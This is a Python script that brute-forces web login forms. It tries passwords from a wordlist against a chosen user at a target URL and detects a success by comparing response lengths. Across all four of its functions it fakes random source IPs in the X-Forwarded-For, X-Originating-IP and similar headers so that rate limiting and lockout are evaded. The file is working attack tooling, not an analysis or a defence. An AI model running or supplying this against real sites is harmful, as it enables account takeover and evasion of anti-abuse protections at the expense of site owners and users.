import argparse
import sys
import requests,re
from random import *

#parser = argparse.ArgumentParser(description="Python Bruteforce Login")
#parser.add_argument('--url', help="Website to target", required=True)
#parser.add_argument('-user', help="User to BruteForce", required=True)
#parser.add_argument('--ufield', help="Field of User in Petition", required=False)
#parser.add_argument('--pfield', help="Field of Password in Petition", required=False)
#parser.add_argument('--wordlist', help="Wordlist of passwords to use", required=True)
#parser.add_argument('--agent', help="User agent string to send the login as", default="Agent:Mozilla/5.0")
#parser.add_argument('--hl', help="Hide Results Via Content-Lenght ", required=False)

#args = parser.parse_args()

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

global proxy

#proxy = {
#  'http': 'http://127.0.0.1:8080',
#}

global op1
global op2
op1 = 1
op2 = 255

global a
a = 1
def load_words(WORDLIST_FILENAME,url,userfile,passwordfile,valid,error,proxy):
       if error == None:
        error = "a"
        proxy = {
          'http': proxy,
        }
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes'}
       uuuuuu = requests.post(url,data=ppp)
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {userfile: valid,passwordfile: final_str}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
}
                resp = requests.post(url,data=pp,proxies=proxy,headers=headers)
                original_req = len(uuuuuu.content)
                comp_req = len(resp.content)
                try:
                  if original_req != comp_req:
                    if original_req < comp_req:
                      resta =  comp_req - original_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                    else:
                      resta = original_req - comp_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                  else:
                    pass
                except:
                  KeyboardInterrupt()


def load_words2(WORDLIST_FILENAME,url,userfile,passwordfile,valid,headerss,error,proxy):
       if error == None:
        error = "a"
       proxy = {
          'http': proxy,
        }
       stringer = headerss
       char = ":"
       indices = [i.start() for i in re.finditer(char, stringer)]
       if len(indices) == 1:
        indices1 = int(indices[0])
        first_p = headerss[:indices1]
        firs_v = headerss[indices1:]
        first_v = firs_v[1:]
       if len(indices) == 2:
          indices1 = int(indices[0])
          indices2 = int(indices[1])
          first_p = headerss[:indices1]
          firs_v = headerss[indices1:]
          stringer = firs_v
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          first_v = firs_v[1:coma[0]]
          stringer = headerss
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          second_p = headerss[coma[0]:indices2][1:]
          second_v = headerss[indices2:][1:]
       




       headers = {
                'X-Forwarded-For': "192.168.9.123",
                'X-Originating-IP': "18.7.1.65",
                'X-Remote-IP': "10.10.14.11",
                'X-Remote-Addr': "167.86.12.1",
                first_p: first_v
}
       if len(indices) == 2:
                  headers = {
                    'X-Forwarded-For': "98.11.2.11",
                    'X-Originating-IP': "161.231.11.32",
                    'X-Remote-IP': "213.321.1.122",
                    'X-Remote-Addr': "21.231.2.7",
                    first_p: first_v,
                    second_p: second_v
}   
       ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes'}
       uuuuuu = requests.post(url,data=ppp,headers=headers,proxies=False)
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {userfile: valid,passwordfile: final_str}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                first_p: first_v
}
                if len(indices) == 2:
                  headers = {
                  'X-Forwarded-For': ip2,
                  'X-Originating-IP': ip2,
                  'X-Remote-IP': ip2,
                  'X-Remote-Addr': ip2,
                    first_p: first_v,
                    second_p: second_v
}
                resp = requests.post(url,data=pp,proxies=proxy,headers=headers)
                original_req = len(uuuuuu.content)
                comp_req = len(resp.content)
                try:
                  if original_req != comp_req:
                    if original_req < comp_req:
                      resta =  comp_req - original_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                    else:
                      resta = original_req - comp_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                  else:
                    pass
                except:
                  KeyboardInterrupt()


def load_words3(WORDLIST_FILENAME,url,userfile,passwordfile,valid,datas,error,proxy):
       if error == None:
        error = "a"
       proxy = {
          'http': proxy,
        }
       stringer = datas
       char = ":"
       indices = [i.start() for i in re.finditer(char, stringer)]
       if len(indices) == 1:
        indices1 = int(indices[0])
        first_p = datas[:indices1]
        firs_v = datas[indices1:]
        first_v = firs_v[1:]
       if len(indices) == 2:
          indices1 = int(indices[0])
          indices2 = int(indices[1])
          first_p = datas[:indices1]
          firs_v = datas[indices1:]
          stringer = firs_v
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          first_v = firs_v[1:coma[0]]
          stringer = datas
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          second_p = datas[coma[0]:indices2][1:]
          second_v = datas[indices2:][1:]
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes',first_p: first_v}
       if len(indices) == 2:
        ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes',first_p: first_v,second_p: second_v}
       uuuuuu = requests.post(url,data=ppp,proxies=proxy)
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {userfile: valid,passwordfile: final_str,first_p: first_v}
                if len(indices) == 2:
                  pp = {userfile: valid,passwordfile: final_str,first_p: first_v,second_p: second_v}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,

}
                resp = requests.post(url,data=pp,proxies=False,headers=headers)
                original_req = len(uuuuuu.content)
                comp_req = len(resp.content)
                try:
                  if original_req != comp_req:
                    if original_req < comp_req:
                      resta =  comp_req - original_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                    else:
                      resta = original_req - comp_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                  else:
                    pass
                except:
                  KeyboardInterrupt()


def load_words4(WORDLIST_FILENAME,url,userfile,passwordfile,valid,datas,headerss,error,proxy):
       if error == None:
        error = "a"
       proxy = {
          'http': proxy,
        }
       stringer = datas
       char = ":"
       indicess = [i.start() for i in re.finditer(char, stringer)]
       if len(indicess) == 1:
        indices1 = int(indicess[0])
        global first_p
        first_p = datas[:indices1]
        firs_v = datas[indices1:]
        first_v = firs_v[1:]
       if len(indicess) == 2:
          indices1 = int(indicess[0])
          indices2 = int(indicess[1])
          first_p = datas[:indices1]
          firs_v = datas[indices1:]
          stringer = firs_v
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          first_v = firs_v[1:coma[0]]
          stringer = datas
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          global second_p
          second_p = datas[coma[0]:indices2][1:]
          second_v = datas[indices2:][1:]


       stringer = headerss
       char = ":"
       indices = [i.start() for i in re.finditer(char, stringer)]
       if len(indices) == 1:
        indices1 = int(indices[0])
        hfirst_p = headerss[:indices1]
        hfirs_v = headerss[indices1:]
        hfirst_v = hfirs_v[1:]
       if len(indices) == 2:
          indices1 = int(indices[0])
          indices2 = int(indices[1])
          hfirst_p = headerss[:indices1]
          hfirs_v = headerss[indices1:]
          stringer = hfirs_v
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          hfirst_v = hfirs_v[1:coma[0]]
          stringer = headerss
          charr = ","
          coma = [i.start() for i in re.finditer(charr, stringer)]
          hsecond_p = headerss[coma[0]:indices2][1:]
          hsecond_v = headerss[indices2:][1:]

       headers = {
                'X-Forwarded-For': "192.168.9.123",
                'X-Originating-IP': "18.7.1.65",
                'X-Remote-IP': "10.10.14.11",
                'X-Remote-Addr': "167.86.12.1",
                hfirst_p: hfirst_v
}
       if len(indices) == 2:
                  headers = {
                    'X-Forwarded-For': "98.11.2.11",
                    'X-Originating-IP': "161.231.11.32",
                    'X-Remote-IP': "213.321.1.122",
                    'X-Remote-Addr': "21.231.2.7",
                    hfirst_p: hfirst_v,
                    hsecond_p: hsecond_v
}   
       ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes',first_p: first_v}
       if len(indicess) == 2:
        ppp = {userfile: 'fooollandooaoa',passwordfile: 'condosdragojjjjjnes',first_p: first_v,second_p: second_v}
       global uuuuuu
       uuuuuu = requests.post(url,data=ppp,headers=headers,proxies=proxy)
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {userfile: valid,passwordfile: final_str,first_p: first_v}
                if len(indicess) == 2:
                  pp = {userfile: valid,passwordfile: final_str,first_p: first_v,second_p: second_v}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                hfirst_p: hfirst_v
}
                if len(indices) == 2:
                  headers = {
                    'X-Forwarded-For': ip2,
                    'X-Originating-IP': ip2,
                    'X-Remote-IP': ip2,
                    'X-Remote-Addr': ip2,
                    hfirst_p: hfirst_v,
                    hsecond_p: hsecond_v
}
                resp = requests.post(url,data=pp,proxies=False,headers=headers)
                original_req = len(uuuuuu.content)
                comp_req = len(resp.content)
                try:
                  if original_req != comp_req:
                    if original_req < comp_req:
                      resta =  comp_req - original_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                    else:
                      resta = original_req - comp_req
                      if resta < 10:
                        pass
                      else:
                        print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+final_str)
                        break
                  else:
                    pass
                except:
                  KeyboardInterrupt()
                  
